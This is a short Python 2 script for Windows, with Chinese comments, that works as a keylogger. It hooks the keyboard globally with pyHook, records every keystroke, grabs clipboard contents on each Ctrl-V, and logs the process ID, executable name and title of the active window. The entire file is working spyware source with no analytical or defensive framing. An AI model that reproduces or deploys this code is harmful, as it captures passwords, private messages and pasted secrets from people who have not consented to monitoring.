#-*- coding:utf8 -*-  
  
from  ctypes  import  *  
import  pythoncom  
import  pyHook  
import  win32clipboard  
  
user32 = windll.user32  
kernel32 = windll.kernel32  
psapi = windll.psapi  
current_window =  None  
  
def  get_current_process():  
  
    # 獲取前台窗口的 handle
    hwnd = user32.GetForegroundWindow()  
  
    # 尋找 procss ID  
    pid = c_ulong( 0 )  
    user32.GetWindowThreadProcessId(hwnd, byref(pid))  
  
    # 保存當前 procss ID   
    process_id =  "%d"  % pid.value  
  
    # 申請記憶體、buffer  
    executable = create_string_buffer( "\x00"  *  512 )  
    
    # 打開 procss   
    h_process = kernel32.OpenProcess( 0x400  |  0x10 ,  False , pid)  
    
    # 獲取 procss 所對應的可執行文件的名字  
    psapi.GetModuleBaseNameA(h_process,  None , byref(executable), 512 )  
  
    # 讀取窗口標題  
    window_title = create_string_buffer( "\x00"  *  512 )  
    length = user32.GetWindowTextA(hwnd, byref(window_title),  512 )  
  
    # 輸出 procss 相關信息  
    print  
    print  "[ PID: %s - %s - %s]"  % (process_id, executable.value, window_title.value)  
    print  
  
    # 關閉 handles  
    kernel32.CloseHandle(hwnd)  
    kernel32.CloseHandle(h_process)  
  
def  keyStore(event):  
    global  current_window  
  
    # 檢查目標是否切換了窗口  
    if  event.WindowName != current_window:  
        current_window = event.WindowName  
        get_current_process()  
  
    # 檢測按鍵是否為一般按鍵(非組合鍵等)  
    if  event.Ascii >  32  and  event.Ascii <  127 :  
        print  chr(event.Ascii),  
    else :  
        # 若輸入為[CTRL-V],則獲取剪切簿內容  
        if  event.Key ==  "V" :  
            win32clipboard.OpenClipboard()  
            pasted_value = win32clipboard.GetClipboardData()  
            win32clipboard.CloseClipboard()  
  
            print  "[PASTE] - %s"  % (pasted_value),  
  
        else :  
            print  "[%s]"  % event.Key,  
  
    # 交給下一個已登記的model去處理 
    return  True  
  
# 建立並且登記 Hook Manager  
k1 =pyHook.HookManager()  
#  
k1.KeyDown = keyStore  
  
# 登記 hook，然後永久執行  
k1.HookKeyboard()  
pythoncom.PumpMessages()  